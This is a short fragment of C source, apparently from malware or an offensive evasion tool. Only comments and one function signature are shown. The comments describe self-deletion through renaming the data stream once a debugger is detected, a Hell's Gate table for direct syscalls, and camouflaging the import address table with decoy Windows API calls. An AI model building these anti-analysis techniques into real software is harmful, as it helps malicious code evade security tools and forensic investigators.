...
/*
 * Self-delete by renaming the data stream after a debugger is detected
 *
 * @param pVxTable: Hell's Gate table for direct syscalls
 *
 * @returns: TRUE if self-deletion was successful
 */
...
/*
 * Obfuscate the IAT by pretending to use random Windows APIs
 */
VOID IatCamouflage() {
